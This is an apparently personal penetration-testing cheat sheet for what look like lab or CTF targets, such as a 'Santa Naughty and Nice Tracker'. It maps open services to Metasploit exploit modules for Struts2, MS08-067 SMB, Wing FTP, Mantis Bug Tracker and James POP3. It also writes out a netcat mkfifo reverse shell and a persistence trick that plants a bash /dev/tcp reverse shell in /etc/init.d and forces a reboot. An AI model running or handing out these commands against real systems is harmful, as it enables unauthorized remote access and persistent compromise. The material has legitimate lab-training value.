# Pwn'd
- 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
- |_http-server-header: Apache-Coyote/1.1
- | http-title: Santa Naughty and Nice Tracker
- USE: 
````
search struts2
exploit(multi/http/struts2_content_type_ognl)
````
- 445/tcp open  miscrosoft-ds
- Run the nmap eternal scripts
- USE:
````
nmap --scripts=smb-vuln* $ip
exploit(windows/smb/ms08_067_netapi)
````
- 21/tcp open  wingftp
- Gain access to the admin panel
````
search lua
exploit(windows/ftp/wing_ftp_admin_exec)
````
- 80/tcp  open  http  mantisbt-2.3.0
- CVE:2019-15715 2017-7615
- Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
- 110/tcp open  POP3 
- James POP3 Server 2.3.2
- https://www.exploit-db.com/exploits/35513
````
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.2 3333 >/tmp/f
echo "#!/bin/bash" > /etc/init.d/james
echo "bash -i >& /dev/tcp/172.16.6.2/5555 0>&1" >> /etc/init.d/james
cat /etc/init.d/james
sudo /sbin/reboot
````
- Version: Apache Tomcat/8.0.47
- OS: Microsoft Windows 2008| Vista | 7
- exploit: multi/http/struts2_rest_xstream
- Targeturi: /struts2-rest-showcase/orders/
- 
